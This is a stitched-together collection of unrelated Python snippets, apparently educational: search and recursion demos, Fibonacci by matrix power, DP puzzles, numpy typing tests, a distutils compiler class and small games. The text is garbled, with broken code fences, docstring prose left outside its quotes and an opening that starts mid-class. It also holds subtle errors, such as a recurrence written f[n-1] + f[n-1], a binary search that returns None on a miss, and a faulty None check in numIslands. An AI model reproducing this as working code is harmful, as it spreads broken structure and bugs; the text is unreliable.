        if isinstance(value, Mapping) and not isinstance(value, NotebookNode):
            value = from_dict(value)
        super(NotebookNode, self).__setitem__(key, value)

    def update(self, *args, **kwargs):
        """
        A dict-like update method based on CPython's MutableMapping `update`
        method.
        """
        if len(args) > 1:
            raise TypeError('update expected at most 1 arguments, got %d' %
                            len(args))
        if args:
            other = args[0]
            if isinstance(other, Mapping):
                for key in other:
                    self[key] = other[key]
            elif hasattr(other, "keys"):
                for key in other.keys():
                    self[key] = other[key]
            else:
                for key, value in other:
                    self[key] = value
        for key, value in kwargs.items():
            self[key] = value


def from_dict(d):
    """Convert dict to dict-like NotebookNode

    Recursively converts any dict in the container to a NotebookNode.
    This does not check that the contents of the dictionary make a valid
    notebook or part of a notebook.
    """
    if isinstance(d, dict):
        return NotebookNode({k: from_dict(v) for k, v in d.items()})
    elif isinstance(d, (tuple, list)):
        return [from_dict(i) for i in d]
    else:
        return d

# Searching and Recursion
# linear searching
# recursion
# binary search
# Linear Search
def linear_search(lst, target):  # O(n) Linear
    for i in range(len(lst)):  # O(n)
        if lst[i] == target:  # O(1)
            return i  # O(1)

    return -1  # O(1)


l = [23, 34, 12, 3, 5654, 2, 13, 456]

print(linear_search(l, 9876))  # -1


# Recursion


def n_times_loop(n):
    # for i in range(n, 0, -1):
    #   print(i)
    while True:
        # base case
        if n <= 0:
            return
        # do something
        print(n)

        n -= 1  # Decrement


n = 5
n_times_loop(n)


print('------------------------------RECURSIVE----------------------------------')


def n_times_recurse(n):
    # base case
    if n <= 0:
        return
    # do something
    print(n)

    # recursive call (decrement)
    n_times_recurse(n - 1)


n = 5
n_times_recurse(n)

print('------------------------------Binary Search---------BigO (log(n))-------------------------')
print('------------------------------Requires Sorted Data...-------------------------')

# Binary Search
# If the list is sorted, then the binary search algorithm will take O(log(n)) time.
#

def binary_search(lst, target):
    low = 0
    high = len(lst) - 1
    while low <= high:
        mid = (low + high) // 2
        if lst[mid] < target:
            low = mid + 1
        elif lst[mid] > target:
            high = mid - 1
        else:
            return True


l = [1, 2, 3, 45, 67, 78, 98, 120, 200]

print(binary_search(l, 78))

import webbrowser
import time

breaks = int(input("How many breaks do you wish to take? : "))
break_count = 0
break_time = int(
    input(
        "Enter after how much time you want a break in min (Minimum 1 min) : ")
)
choice = input(
    "Would you love to hear a mediation song in the break?\n Enter Y for yes and N for No : "
)
if (break_count < breaks):
    time.sleep(break_time * 60)
    if (choice == "Y"):
        webbrowser.open("https://www.youtube.com/watch?v=Pw3mhrf7Uuo")
        break_count = break_count + 1
    else:
        print("Please Take a break and have a walk")
        break_count = break_count + 1

if (break_count == 1):
    while (break_count < breaks):
        time.sleep(break_time * 60)
        if (choice == "Y"):
            webbrowser.open("https://www.youtube.com/watch?v=Pw3mhrf7Uuo")
            break_count = break_count + 1
        else:
            print("Please Take a break and have a walk")
            break_count = break_count + 1

else:
    exit
```

````py
Implementation of finding nth fibonacci number using matrix exponentiation.
Time Complexity is about O(log(n)*8), where 8 is the complexity of matrix
multiplication of size 2 by 2.
And on the other hand complexity of bruteforce solution is O(n).
As we know
    f[n] = f[n-1] + f[n-1]
Converting to matrix,
    [f(n),f(n-1)] = [[1,1],[1,0]] * [f(n-1),f(n-2)]
->  [f(n),f(n-1)] = [[1,1],[1,0]]^2 * [f(n-2),f(n-3)]
    ...
    ...
->  [f(n),f(n-1)] = [[1,1],[1,0]]^(n-1) * [f(1),f(0)]
So we just need the n times multiplication of the matrix [1,1],[1,0]].
We can decrease the n times multiplication by following the divide and conquer approach.```


```py


def multiply(matrix_a, matrix_b):
    matrix_c = []
    n = len(matrix_a)
    for i in range(n):
        list_1 = []
        for j in range(n):
            val = 0
            for k in range(n):
                val = val + matrix_a[i][k] * matrix_b[k][j]
            list_1.append(val)
        matrix_c.append(list_1)
    return matrix_c


def identity(n):
    return [[int(row == column) for column in range(n)] for row in range(n)]


def nth_fibonacci_matrix(n):
    """
    >>> nth_fibonacci_matrix(100)
    354224848179261915075
    >>> nth_fibonacci_matrix(-100)
    -100
    """
    if n <= 1:
        return n
    res_matrix = identity(2)
    fibonacci_matrix = [[1, 1], [1, 0]]
    n = n - 1
    while n > 0:
        if n % 2 == 1:
            res_matrix = multiply(res_matrix, fibonacci_matrix)
        fibonacci_matrix = multiply(fibonacci_matrix, fibonacci_matrix)
        n = int(n / 2)
    return res_matrix[0][0]


def nth_fibonacci_bruteforce(n):
    """
    >>> nth_fibonacci_bruteforce(100)
    354224848179261915075
    >>> nth_fibonacci_bruteforce(-100)
    -100
    """
    if n <= 1:
        return n
    fib0 = 0
    fib1 = 1
    for i in range(2, n + 1):
        fib0, fib1 = fib1, fib0 + fib1
    return fib1


def main():
    for ordinal in "0th 1st 2nd 3rd 10th 100th 1000th".split():
        n = int("".join(c for c in ordinal if c in "0123456789"))  # 1000th --> 1000
        print(
            f"{ordinal} fibonacci number using matrix exponentiation is "
            f"{nth_fibonacci_matrix(n)} and using bruteforce is "
            f"{nth_fibonacci_bruteforce(n)}\n"
        )
    # from timeit import timeit
    # print(timeit("nth_fibonacci_matrix(1000000)",
    #              "from main import nth_fibonacci_matrix", number=5))
    # print(timeit("nth_fibonacci_bruteforce(1000000)",
    #              "from main import nth_fibonacci_bruteforce", number=5))
    # 2.3342058970001744
    # 57.256506615000035


if __name__ == "__main__":
    main()

# $Id: null.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: Martin Blais <blais@furius.ca>
# Copyright: This module has been placed in the public domain.
````

```pyA do-nothing parser."""

from docutils import parsers


class Parser(parsers.Parser):

    """A do-nothing parser."""

    supported = ('null',)

    config_section = 'null parser'
    config_section_dependencies = ('parsers',)

    def parse(self, inputstring, document):
        pass

#!/usr/bin/python3
from random import randint

MAX_ = 500  # Specify biggest possible value from random number generation

# Asks user for a guess and returns this when successful
def get_guess():
    while True:  # Run forever, until broken
        try:  # Try the following, if fails, run the except statment
            user_input = int(
                input("Guess a number: ")
            )  # Get user input and covert it to an int (number)
            break  # If the input can be converted, break the loop
        except ValueError:  # This runs if the input could not be converted - text was entered
            print(
                "Enter a number!\n"
            )  # Tell them to enter a number, then run loop again
    return user_input  # Return value when loop broken


num_to_guess = randint(0, MAX_)  # Generates a random number between 0 and value of MAX_
print(
    "Welcome to my random number guessing game!\nGuess a number between 0 and ",
    MAX_,
    "\n",
)

while True:
    guess = get_guess()
    if guess >= 0 and guess <= MAX_:  # Check if guess between 0 and max

        # Correct number!
        if guess == num_to_guess:
            print("That's a correct guess!\nYou got it!\n")
            break

        # Incorrect - give hint
        elif guess < num_to_guess:
            print("Try a bigger num!")  # Number to small
        else:
            print("Try a smaller num!")  # Number to big

    # Number is not in range
    else:
        print("Enter a number in between 0 and ", MAX_)

    print("")
```

```py

*Challenge*

  1) Can you give the user the option to Play Again?
   - if yes, the game will reset - including the random number

  2) Try count the number of guesses and give a score to the user when they guess the number
   - the lower the guesses, the higher the score
```

```py

import sys

# Use of
# Conditionals in python
# Determines weather the number is positive negative or zero
def pos_neg_zero(x):
    if x < 0:
        return "Negative"
    elif x > 0:
        return "Positive"
    return "Zero"


while True:
    if str(raw_input(" Start [Y/n]?  ")).strip().lower() == "y":
        print("    [Num] = " + pos_neg_zero(float(raw_input(" Number:  "))) + "\n")
    else:
        print("Bye!")
        sys.exit(0)
```

````py
Number of Decodings

Given the mapping a=1, b=2, ... , z=26, and an encoded message, count the number of ways it can be decoded.
For example, the message "111" would give 3, since it could be decoded as "aaa", "ka" and "ak".
All of the messages are decodable!

=========================================
The easiest solution is Brute-Force (building a tree and making all combinations),
and in the worst case there will be Fibbionaci(N) combinations, so the worst Time Complexity will be O(Fib(N))

Dynamic programming solution. Similar to number_of_smses.py.
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def num_decodings(code):
    n = len(code)
    dp = [0 for i in range(n)]

    if n == 0:
        return 0
    dp[0] = 1
    if n == 1:
        return dp[0]
    dp[1] = (code[1] != "0") + is_valid(code[0:2])

    for i in range(2, n):
        if code[i] != "0":
            # looking for how many combinations are there till now if this is a single digit
            dp[i] += dp[i - 1]
        if is_valid(code[i - 1 : i + 1]):
            # looking for how many combinations are there till now if this is a number of 2 digits
            dp[i] += dp[i - 2]

    return dp[n - 1]


def is_valid(code):
    k = int(code)
    return (k < 27) and (k > 9)


###########
# Testing #
###########

# Test 1
# Correct result => 5
print(num_decodings("12151"))

# Test 2
# Correct result => 5
print(num_decodings("1111"))

# Test 3
# Correct result => 3
print(num_decodings("111"))

# Test 4
# Correct result => 1
print(num_decodings("1010"))

# Test 5
# Correct result => 4
print(num_decodings("2626"))

# Test 6
# Correct result => 1
print(num_decodings("1"))

# Test 7
# Correct result => 2
print(num_decodings("11"))

# Test 8
# Correct result => 3
print(num_decodings("111"))

# Test 9
# Correct result => 5
print(num_decodings("1111"))

# Test 10
# Correct result => 8
print(num_decodings("11111"))

# Test 11
# Correct result => 13
print(num_decodings("111111"))

# Test 12
# Correct result => 21
print(num_decodings("1111111"))

# Test 13
# Correct result => 34
print(num_decodings("11111111"))
````

````py
Given a 2d grid map of '1's (land) and '0's (water), count the number of islands. An island is surrounded by water
and is formed by connecting adjacent lands horizontally or vertically. You may assume all four edges of the grid
are all surrounded by water.```


```py


def numIslands(grid):
    if grid is None and len(grid) == 0:
        return 0
    nuOfIslands = 0
    for i in range(len(grid)):
        for j in range(len(grid[i])):
            if grid[i][j] == "1":
                nuOfIslands += 1
                dfs(grid, i, j)
    return nuOfIslands


def dfs(grid, i, j):
    if (
        (j >= len(grid[0]))
        or (j < 0)
        or (i < 0)
        or (i >= len(grid))
        or (grid[i][j] != "1")
    ):
        return 0
    grid[i][j] = 0
    dfs(grid, i, j + 1)
    dfs(grid, i + 1, j)
    dfs(grid, i - 1, j)
    dfs(grid, i, j - 1)


grid = [["1", "1", "0"], ["1", "1", "0"], ["0", "0", "1"], ["0", "0", "0"]]
print(numIslands(grid))
````

````py
Hey, we are going to find an exciting number called Catalan number which is use to find
the number of possible binary search trees from tree of a given number of nodes.

We will use the formula: t(n) = SUMMATION(i = 1 to n)t(i-1)t(n-i)

Further details at Wikipedia: https://en.wikipedia.org/wiki/Catalan_number```









---


```py

Our Contribution:
Basically we Create the 2 function:
    1. catalan_number(node_count: int) -> int
        Returns the number of possible binary search trees for n nodes.
    2. binary_tree_count(node_count: int) -> int
        Returns the number of possible binary trees for n nodes.```


```py


def binomial_coefficient(n: int, k: int) -> int:
    """
    Since Here we Find the Binomial Coefficient:
    https://en.wikipedia.org/wiki/Binomial_coefficient
    C(n,k) = n! / k!(n-k)!
    :param n: 2 times of Number of nodes
    :param k: Number of nodes
    :return:  Integer Value

    >>> binomial_coefficient(4, 2)
    6
    """
    result = 1  # To kept the Calculated Value
    # Since C(n, k) = C(n, n-k)
    if k > (n - k):
        k = n - k
    # Calculate C(n,k)
    for i in range(k):
        result *= n - i
        result //= i + 1
    return result


def catalan_number(node_count: int) -> int:
    """
    We can find Catalan number many ways but here we use Binomial Coefficient because it
    does the job in O(n)

    return the Catalan number of n using 2nCn/(n+1).
    :param n: number of nodes
    :return: Catalan number of n nodes

    >>> catalan_number(5)
    42
    >>> catalan_number(6)
    132
    """
    return binomial_coefficient(2 * node_count, node_count) // (node_count + 1)


def factorial(n: int) -> int:
    """
    Return the factorial of a number.
    :param n: Number to find the Factorial of.
    :return: Factorial of n.

    >>> import math
    >>> all(factorial(i) == math.factorial(i) for i in range(10))
    True
    >>> factorial(-5)  # doctest: +ELLIPSIS
    Traceback (most recent call last):
    ...
    ValueError: factorial() not defined for negative values
    """
    if n < 0:
        raise ValueError("factorial() not defined for negative values")
    result = 1
    for i in range(1, n + 1):
        result *= i
    return result


def binary_tree_count(node_count: int) -> int:
    """
    Return the number of possible of binary trees.
    :param n: number of nodes
    :return: Number of possible binary trees

    >>> binary_tree_count(5)
    5040
    >>> binary_tree_count(6)
    95040
    """
    return catalan_number(node_count) * factorial(node_count)


if __name__ == "__main__":
    node_count = int(input("Enter the number of nodes: ").strip() or 0)
    if node_count <= 0:
        raise ValueError("We need some nodes to work with.")
    print(
        f"Given {node_count} nodes, there are {binary_tree_count(node_count)} "
        f"binary trees and {catalan_number(node_count)} binary search trees."
    )
````

````py
Number of SMSes

Given the number sequence that is being typed in order to write and SMS message, return the count
of all the possible messages that can be constructed.

 1    2    3
     abc  def

 4    5    6
ghi  jkl  mno

 7    8    9
pqrs tuv wxyz

The blank space character is constructed with a '0'.

Input: '222'
Output: 4
Output explanation: '222' could mean: 'c', 'ab','ba' or 'aaa'. That makes 4 possible messages.

=========================================
Dynamic programming solution. Similar to number_of_decodings.py.
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def num_smses(sequence):
    n = len(sequence)
    dp = [0] * n

    # dp starting values, check all 4 possible starting combinations
    for i in range(min(4, n)):
        if is_valid(sequence[0 : i + 1]):
            dp[i] = 1

    # run dp
    for i in range(1, n):
        # check all 4 possible combinations (x, xx, xxx, xxxx)
        for j in range(min(4, i)):
            if is_valid(sequence[i - j : i + 1]):
                dp[i] += dp[i - j - 1]

    return dp[n - 1]


def is_valid(sequence):
    ch = sequence[0]

    for c in sequence:
        if c != ch:
            return False

    if sequence == "0":
        return True

    if ((ch >= "2" and ch <= "6") or ch == "8") and (len(sequence) < 4):
        return True

    if (ch == "7") or (ch == "9"):
        return True

    return False


###########
# Testing #
###########

# Test 1
# Correct result => 4
print(num_smses("222"))

# Test 2
# Correct result => 14
print(num_smses("2202222"))

# Test 3
# Correct result => 274
print(num_smses("2222222222"))

def spiralNumbers(n):
    dims = n
    elem = 1
    matrix = [[0] * n for x in range(n)]
    while 0 < dims:
        i = n - dims
        # you can sub i = n - dims ONLY in the first 2 parts
        # where n - dims is in the starting parameter of the range
        for j in range(n - dims, dims):
            matrix[i][j] = elem
            elem += 1
        for i in range(n - dims + 1, dims):
            matrix[i][j] = elem
            elem += 1
        for j in range(dims - 2, n - dims - 1, -1):
            matrix[i][j] = elem
            elem += 1
        for i in range(dims - 2, n - dims, -1):
            matrix[i][j] = elem
            elem += 1
        dims -= 1
    return matrix

_FIRST20 = [
    "zero",
    "one",
    "two",
    "three",
    "four",
    "five",
    "six",
    "seven",
    "eight",
    "nine",
    "ten",
    "eleven",
    "twelve",
    "thirteen",
    "fourteen",
    "fifteen",
    "sixteen",
    "seventeen",
    "eighteen",
    "nineteen",
]

_TENS = [
    "zero",
    "ten",
    "twenty",
    "thirty",
    "forty",
    "fifty",
    "sixty",
    "seventy",
    "eighty",
    "ninety",
]

_UNITS = [
    (12, "trillion"),
    (9, "billion"),
    (6, "million"),
    (3, "thousand"),
    (2, "hundred"),
]

MAX_NUMBER = 10 ** _UNITS[0][0] - 1


JOIN_WORD = "and"


def num2words(number):
    if number < 0:
        return "minus " + _num2unit_words(-number)
    else:
        return _num2unit_words(number)


def _num2unit_words(number, units=_UNITS):
    spelled = []

    for p, name in units:
        units_number, number = divmod(number, 10 ** p)

        if not units_number:
            continue

        spelled += [_num2unit_words(units_number, units=units[1:]), name]

    if number:
        if spelled and JOIN_WORD:
            spelled += [JOIN_WORD]
        spelled += [_smallnum2words(number)]
    elif not spelled:
        spelled = [_FIRST20[0]]

    return " ".join(spelled)


def _smallnum2words(number):
    assert number < 100, number
    number = int(number)

    if number < 20:
        return _FIRST20[number]
    elif not number % 10:
        return _TENS[number // 10]
    else:
        return _TENS[number // 10] + "-" + _FIRST20[number % 10]
````

```py
Tests for :mod:`numpy.core.numeric`.

Does not include tests which fall under ``array_constructors``.
```

```py

from typing import List
import numpy as np

class SubClass(np.ndarray):
    ...

i8 = np.int64(1)

A = np.arange(27).reshape(3, 3, 3)
B: List[List[List[int]]] = A.tolist()
C = np.empty((27, 27)).view(SubClass)

np.count_nonzero(i8)
np.count_nonzero(A)
np.count_nonzero(B)
np.count_nonzero(A, keepdims=True)
np.count_nonzero(A, axis=0)

np.isfortran(i8)
np.isfortran(A)

np.argwhere(i8)
np.argwhere(A)

np.flatnonzero(i8)
np.flatnonzero(A)

np.correlate(B[0][0], A.ravel(), mode="valid")
np.correlate(A.ravel(), A.ravel(), mode="same")

np.convolve(B[0][0], A.ravel(), mode="valid")
np.convolve(A.ravel(), A.ravel(), mode="same")

np.outer(i8, A)
np.outer(B, A)
np.outer(A, A)
np.outer(A, A, out=C)

np.tensordot(B, A)
np.tensordot(A, A)
np.tensordot(A, A, axes=0)
np.tensordot(A, A, axes=(0, 1))

np.isscalar(i8)
np.isscalar(A)
np.isscalar(B)

np.roll(A, 1)
np.roll(A, (1, 2))
np.roll(B, 1)

np.rollaxis(A, 0, 1)

np.moveaxis(A, 0, 1)
np.moveaxis(A, (0, 1), (1, 2))

np.cross(B, A)
np.cross(A, A)

np.indices([0, 1, 2])
np.indices([0, 1, 2], sparse=False)
np.indices([0, 1, 2], sparse=True)

np.binary_repr(1)

np.base_repr(1)

np.allclose(i8, A)
np.allclose(B, A)
np.allclose(A, A)

np.isclose(i8, A)
np.isclose(B, A)
np.isclose(A, A)

np.array_equal(i8, A)
np.array_equal(B, A)
np.array_equal(A, A)

np.array_equiv(i8, A)
np.array_equiv(B, A)
np.array_equiv(A, A)
```

````py
Approximates the area under the curve using the trapezoidal rule```


```py

from typing import Callable, Union


def trapezoidal_area(
    fnc: Callable[[Union[int, float]], Union[int, float]],
    x_start: Union[int, float],
    x_end: Union[int, float],
    steps: int = 100,
) -> float:

    """
    Treats curve as a collection of linear lines and sums the area of the
    trapezium shape they form
    :param fnc: a function which defines a curve
    :param x_start: left end point to indicate the start of line segment
    :param x_end: right end point to indicate end of line segment
    :param steps: an accuracy gauge; more steps increases the accuracy
    :return: a float representing the length of the curve

    >>> def f(x):
    ...    return 5
    >>> '%.3f' % trapezoidal_area(f, 12.0, 14.0, 1000)
    '10.000'

    >>> def f(x):
    ...    return 9*x**2
    >>> '%.4f' % trapezoidal_area(f, -4.0, 0, 10000)
    '192.0000'

    >>> '%.4f' % trapezoidal_area(f, -4.0, 4.0, 10000)
    '384.0000'
    """
    x1 = x_start
    fx1 = fnc(x_start)
    area = 0.0

    for i in range(steps):

        # Approximates small segments of curve as linear and solve
        # for trapezoidal area
        x2 = (x_end - x_start) / steps + x1
        fx2 = fnc(x2)
        area += abs(fx2 + fx1) * (x2 - x1) / 2

        # Increment step
        x1 = x2
        fx1 = fx2
    return area


if __name__ == "__main__":

    def f(x):
        return x ** 3

    print("f(x) = x^3")
    print("The area between the curve, x = -10, x = 10 and the x axis is:")
    i = 10
    while i <= 100000:
        area = trapezoidal_area(f, -5, 5, i)
        print(f"with {i} steps: {area}")
        i *= 10

import numpy as np

# Techincally this works, but probably shouldn't. See
#
# https://github.com/numpy/numpy/issues/16366
#
np.maximum_sctype(1)  # E: incompatible type "int"

np.issubsctype(1, np.int64)  # E: incompatible type "int"

np.issubdtype(1, np.int64)  # E: incompatible type "int"

np.find_common_type(np.int64, np.int64)  # E: incompatible type "Type[signedinteger[Any]]"

# XXX: Handle setuptools ?
from distutils.core import Distribution

# This class is used because we add new files (sconscripts, and so on) with the
# scons command
class NumpyDistribution(Distribution):
    def __init__(self, attrs = None):
        # A list of (sconscripts, pre_hook, post_hook, src, parent_names)
        self.scons_data = []
        # A list of installable libraries
        self.installed_libraries = []
        # A dict of pkg_config files to generate/install
        self.installed_pkg_config = {}
        Distribution.__init__(self, attrs)

    def has_scons_scripts(self):
        return bool(self.scons_data)

import sys

from numpy.distutils.fcompiler import FCompiler

compilers = ['NVHPCFCompiler']

class NVHPCFCompiler(FCompiler):
    """ NVIDIA High Performance Computing (HPC) SDK Fortran Compiler

    https://developer.nvidia.com/hpc-sdk

    Since august 2020 the NVIDIA HPC SDK includes the compilers formerly known as The Portland Group compilers,
    https://www.pgroup.com/index.htm.
    See also `numpy.distutils.fcompiler.pg`.
    """

    compiler_type = 'nv'
    description = 'NVIDIA HPC SDK'
    version_pattern = r'\s*(nvfortran|(pg(f77|f90|fortran)) \(aka nvfortran\)) (?P<version>[\d.-]+).*'

    executables = {
        'version_cmd': ["<F90>", "-V"],
        'compiler_f77': ["nvfortran"],
        'compiler_fix': ["nvfortran", "-Mfixed"],
        'compiler_f90': ["nvfortran"],
        'linker_so': ["<F90>"],
        'archiver': ["ar", "-cr"],
        'ranlib': ["ranlib"]
    }
    pic_flags = ['-fpic']

    module_dir_switch = '-module '
    module_include_switch = '-I'

    def get_flags(self):
        opt = ['-Minform=inform', '-Mnosecond_underscore']
        return self.pic_flags + opt

    def get_flags_opt(self):
        return ['-fast']

    def get_flags_debug(self):
        return ['-g']

    def get_flags_linker_so(self):
        return ["-shared", '-fpic']

    def runtime_library_dir_option(self, dir):
        return '-R%s' % dir

if __name__ == '__main__':
    from distutils import log
    log.set_verbosity(2)
    from numpy.distutils import customized_fcompiler
    print(customized_fcompiler(compiler='nv').get_version())

# referenced here https://docs.python.org/3/tutorial/classes.html
# Make a class LatLon that can be passed parameters `lat` and `lon` to the
# constructor


class LatLon:
    def __init__(self, lat, lon):
        self.lat = lat
        self.lon = lon

    def __str__(self):
        return str(self.__class__) + ": " + str(self.__dict__)
# Make a class Waypoint that can be passed parameters `name`, `lat`, and `lon` to the
# constructor. It should inherit from LatLon.


class Waypoint(LatLon):
    def __init__(self, name, lat, lon):
        super().__init__(lat, lon)
        self.name = name

    def __str__(self):
        return str(self.name) + ": (" + str(self.lat) + ", " + str(self.lon) + ")"
# Make a class Geocache that can be passed parameters `name`, `difficulty`,
# `size`, `lat`, and `lon` to the constructor. What should it inherit from?


class Geocache(Waypoint):
    def __init__(self, name, difficulty, size, lat, lon):
        super().__init__(name, lat, lon)
        self.difficulty = difficulty
        self.size = size

    def __str__(self):
        return "[" + str(self.name) + "]" + "\n Difficulty: " + str(self.difficulty) + "\n Size: " + str(self.size) + "\n LatLon: (" + str(self.lat) + ", " + str(self.lon) + ")"


# Make a new waypoint "Catacombs", 41.70505, -121.51521
w = Waypoint("Catacombs", 41.70505, -121.51521)

# Print it
#
# Without changing the following line, how can you make it print into something
# more human-readable?
print(w)

# Make a new geocache "Newberry Views", diff 1.5, size 2, 44.052137, -121.41556
g = Geocache("Newberry Views", 1.5, 2, 44.052137, -121.41556)
# Print it--also make this print more nicely
print(g)

def oct_to_decimal(oct_string: str) -> int:
    """
    Convert a octal value to its decimal equivalent

    >>> oct_to_decimal("12")
    10
    >>> oct_to_decimal(" 12   ")
    10
    >>> oct_to_decimal("-45")
    -37
    >>> oct_to_decimal("2-0Fm")
    Traceback (most recent call last):
    ...
    ValueError: Non-octal value was passed to the function
    >>> oct_to_decimal("")
    Traceback (most recent call last):
    ...
    ValueError: Empty string was passed to the function
    >>> oct_to_decimal("19")
    Traceback (most recent call last):
    ...
    ValueError: Non-octal value was passed to the function
    """
    oct_string = str(oct_string).strip()
    if not oct_string:
        raise ValueError("Empty string was passed to the function")
    is_negative = oct_string[0] == "-"
    if is_negative:
        oct_string = oct_string[1:]
    if not oct_string.isdigit() or not all(0 <= int(char) <= 7 for char in oct_string):
        raise ValueError("Non-octal value was passed to the function")
    decimal_number = 0
    for char in oct_string:
        decimal_number = 8 * decimal_number + int(char)
    if is_negative:
        decimal_number = -decimal_number
    return decimal_number


if __name__ == "__main__":
    from doctest import testmod

    testmod()
````

````py
Odd Even Linked List

Given a singly linked list, group all odd nodes together followed by the even nodes.
Please note here we are talking about the node number and not the value in the nodes.
The first node is considered odd, the second node even and so on ...

Input: 1 -> 2 -> 3 -> 4 -> 5
Output: 1 -> 3 -> 5 -> 2 -> 4

Input: 2 -> 1 -> 3 -> 5 -> 6 -> 4 -> 7
Output: 2 -> 3 -> 6 -> 7 -> 1 -> 5 -> 4

=========================================
Count the index of the node and add it to the odd or even linked list (without creating new nodes).
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############

# import ListNode class from ll_helpers.py
from ll_helpers import ListNode


def odd_even_ll(head):
    odd = ListNode(None)
    oddPointer = odd

    even = ListNode(None)
    evenPointer = even

    i = 1
    while head is not None:
        if i % 2 == 1:
            oddPointer.next = head
            oddPointer = oddPointer.next
        else:
            evenPointer.next = head
            evenPointer = evenPointer.next

        head = head.next
        i += 1

    evenPointer.next = None
    oddPointer.next = even.next

    return odd.next


###########
# Testing #
###########

# import build_ll and print_ll methods from ll_helpers.py
from ll_helpers import build_ll, print_ll

# Test 1
# Correct result => 1 -> 3 -> 5 -> 2 -> 4
print_ll(odd_even_ll(build_ll([1, 2, 3, 4, 5])))

# Test 2
# Correct result => 2 -> 3 -> 6 -> 7 -> 1 -> 5 -> 4
print_ll(odd_even_ll(build_ll([2, 1, 3, 5, 6, 4, 7])))
````

````pyFor reference
https://en.wikipedia.org/wiki/Odd%E2%80%93even_sort```


```py


def odd_even_sort(input_list: list) -> list:
    """this algorithm uses the same idea of bubblesort,
    but by first dividing in two phase (odd and even).
    Originally developed for use on parallel processors
    with local interconnections.
    :param collection: mutable ordered sequence of elements
    :return: same collection in ascending order
    Examples:
    >>> odd_even_sort([5 , 4 ,3 ,2 ,1])
    [1, 2, 3, 4, 5]
    >>> odd_even_sort([])
    []
    >>> odd_even_sort([-10 ,-1 ,10 ,2])
    [-10, -1, 2, 10]
    >>> odd_even_sort([1 ,2 ,3 ,4])
    [1, 2, 3, 4]
    """
    sorted = False
    while sorted is False:  # Until all the indices are traversed keep looping
        sorted = True
        for i in range(0, len(input_list) - 1, 2):  # iterating over all even indices
            if input_list[i] > input_list[i + 1]:

                input_list[i], input_list[i + 1] = input_list[i + 1], input_list[i]
                # swapping if elements not in order
                sorted = False

        for i in range(1, len(input_list) - 1, 2):  # iterating over all odd indices
            if input_list[i] > input_list[i + 1]:
                input_list[i], input_list[i + 1] = input_list[i + 1], input_list[i]
                # swapping if elements not in order
                sorted = False
    return input_list


if __name__ == "__main__":
    print("Enter list to be sorted")
    input_list = [int(x) for x in input().split()]
    # inputing elements of the list in one line
    sorted_list = odd_even_sort(input_list)
    print("The sorted list is")
    print(sorted_list)
````

````py
Source: https://en.wikipedia.org/wiki/Odd%E2%80%93even_sort

This is a non-parallelized implementation of odd-even transpostiion sort.

Normally the swaps in each set happen simultaneously, without that the algorithm
is no better than bubble sort.```


```py


def odd_even_transposition(arr: list) -> list:
    """
    >>> odd_even_transposition([5, 4, 3, 2, 1])
    [1, 2, 3, 4, 5]

    >>> odd_even_transposition([13, 11, 18, 0, -1])
    [-1, 0, 11, 13, 18]

    >>> odd_even_transposition([-.1, 1.1, .1, -2.9])
    [-2.9, -0.1, 0.1, 1.1]
    """
    arr_size = len(arr)
    for _ in range(arr_size):
        for i in range(_ % 2, arr_size - 1, 2):
            if arr[i + 1] < arr[i]:
                arr[i], arr[i + 1] = arr[i + 1], arr[i]

    return arr


if __name__ == "__main__":
    arr = list(range(10, 0, -1))
    print(f"Original: {arr}. Sorted: {odd_even_transposition(arr)}")
````

````py
Odd Sum

For a given range [а,b], find the sum of all odd numbers between a and b.

Input: 3, 9
Output: 24
Output explanation: 3+5+7+9=24

=========================================
Several different O(1) approaches exist. This is the explanation of my solution/formula.
3 + 5 + 7 + 9 can be written like (3 + 0) + (3 + 2) + (3 + 4) + (3 + 6)
that's (3 * 4) + (2 + 4 + 6), also this can be written like
(3 * 4) + ((2 * 1) + (2 * 2) + (2 * 3)) = 3 * 4 + 2 * (1 + 2 + 3)
And the formula is: Min_Odd * Num_Odds + 2 * Sum(Num_Odds)
Sum formula is N*(N-1)/2. (for all numbers smaller than N)
This is the simplest formula:
Min_Odd * Num_Odds + 2 * Num_Odds * (Num_Odds - 1) / 2 =
Num_Odds * (Min_Odd + Num_Odds - 1)
    Time Complexity:    O(1)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def odd_sum(a, b):
    # find first odd number
    if a % 2 == 0:
        a += 1
    # to avoid rounding (math.ceil) find the biggest even number
    if b % 2 == 1:
        b += 1
    # count of odd numbers
    n = (b - a + 1) // 2
    # use the formula from the description
    return n * (a + n - 1)


###########
# Testing #
###########

# Test 1
# Correct result => 24
print(odd_sum(3, 9))

# https://en.wikipedia.org/wiki/Ohm%27s_law
from typing import Dict


def ohms_law(voltage: float, current: float, resistance: float) -> Dict[str, float]:
    """
    Apply Ohm's Law, on any two given electrical values, which can be voltage, current,
    and resistance, and then in a Python dict return name/value pair of the zero value.

    >>> ohms_law(voltage=10, resistance=5, current=0)
    {'current': 2.0}
    >>> ohms_law(voltage=0, current=0, resistance=10)
    Traceback (most recent call last):
      ...
    ValueError: One and only one argument must be 0
    >>> ohms_law(voltage=0, current=1, resistance=-2)
    Traceback (most recent call last):
      ...
    ValueError: Resistance cannot be negative
    >>> ohms_law(resistance=0, voltage=-10, current=1)
    {'resistance': -10.0}
    >>> ohms_law(voltage=0, current=-1.5, resistance=2)
    {'voltage': -3.0}
    """
    if (voltage, current, resistance).count(0) != 1:
        raise ValueError("One and only one argument must be 0")
    if resistance < 0:
        raise ValueError("Resistance cannot be negative")
    if voltage == 0:
        return {"voltage": float(current * resistance)}
    elif current == 0:
        return {"current": voltage / resistance}
    elif resistance == 0:
        return {"resistance": voltage / current}
    else:
        raise ValueError("Exactly one argument must be 0")


if __name__ == "__main__":
    import doctest

    doctest.testmod()

class once:
    def __init__(self, func, times=1):
        self.times = int(times)
        self.func = func

    def __call__(self, *args, **kwargs):
        if self.times > 0:
            self.times -= 1
            return self.func(*args, **kwargs)
````

````py
Return an image of 16 generations of one-dimensional cellular automata based on a given
ruleset number
https://mathworld.wolfram.com/ElementaryCellularAutomaton.html```


```py

from __future__ import annotations

from PIL import Image

# Define the first generation of cells
# fmt: off
CELLS = [[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1,
          0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]
